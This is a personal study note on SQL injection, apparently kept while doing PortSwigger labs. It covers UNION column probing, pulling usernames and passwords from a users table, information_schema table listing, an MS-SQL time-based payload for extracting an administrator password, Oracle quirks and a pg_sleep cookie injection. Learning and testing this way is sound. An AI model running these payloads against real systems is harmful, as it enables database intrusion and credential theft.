# SQL Injection
Tags: #sqli #database
Related to: [[oracle]]
See also:
Previous:

## Links
Title: Portswigger SQLi cheatsheet
Link: https://portswigger.net/web-security/sql-injection/cheat-sheet
Description: Useful payloads for SQLi testing. Has different modifications per database

Title: Find Table Names for SQL Injection
Link: https://www.sqlinjection.net/table-names/
Description: More info into actually getting table info from schema tables. More in detail than the Portswigger cheatsheet

## Notes
- You don't need to SELECT FROM something (e.g. `SELECT 1`, `SELECT NULL,NULL`)
- Swap out `--` for `#` sometimes. It may cause an error in some cases and not in others
- Be very careful about how the payload is being encoded. IN the case of injecting into a cookie for example, I have gotten stuck when the payload was not properly encoded. This is probably due to editing the payload in the wrong section of the Inspector tool in Burp Repeater. Watch out!


### UNION attack
-  How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?
e.g.: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

`' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3--`
`' UNION SELECT NULL--  
' UNION SELECT NULL,NULL--  
' UNION SELECT NULL,NULL,NULL--`

### Joining multiple results into one column
e.g. in the case where you want two strings from different columns, but only one column in the original query uses the string type.

In the below example, column 1 does not support strings, but column2 does. This gives us `username~password` from the users table..

`' UNION SELECT null,username || '~' || password FROM users--`

### Getting table names
Non-Oracle:
`' UNION SELECT table_name,NULL from information_schema.tables--`

### Blind SQLi
[Blind SQLi on Portswigger](https://portswigger.net/web-security/sql-injection/blind)
Data can be extracted by triggering error-messages or time-based delays based on logical statements inserted into the SQLi parameter.

### Batched/stacked queries
_See: https://portswigger.net/web-security/sql-injection/cheat-sheet, section **Batched (or stacked) queries**_

Refers to using a semi-colon to execute an additional query during a SQLi, e.g.:

`QUERY1-HERE; QUERY2-HERE--`

Only the information from `QUERY1-HERE` gets returned to the app! `QUERY2-HERE` is used in side-channel attacks (error, time-based, "out of band")

#### Why use stacked queries?
- It's a technique in cases of error-based, time-based, or "out of band" SQLi exploits
- The second query is one you can write from scratch, so you can do complex logic to exfiltrate information.
- e.g. the below payload can be used and modified to do a binary search to discover a plaintext password based on causing a delay in a MS-SQL database.

```
`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
```

**N.B.** Oracle does not support stacked queries!! Instead of using a semicolon to add a second query, you can use `UNION`, so:

```
x' UNION SELECT COMPLEX-QUERY FROM dual--
```

### "Gotchas"
A list of issues that can make SQLi payloads fail

#### Oracle
Oracle DB behaves in a strange way relative to other databases. More info can be found in [[oracle]].

tl;dr:
- You always need `FROM dual`
- No stacked/batched queries
- Very little documentation

#### SQLi into Cookies
Use concantenation to avoid using semi-colons or spaces that can interfere with how the Request is parsed

Comments at the end are still necessary,e.g.
`x'||pg_sleep(10)--`

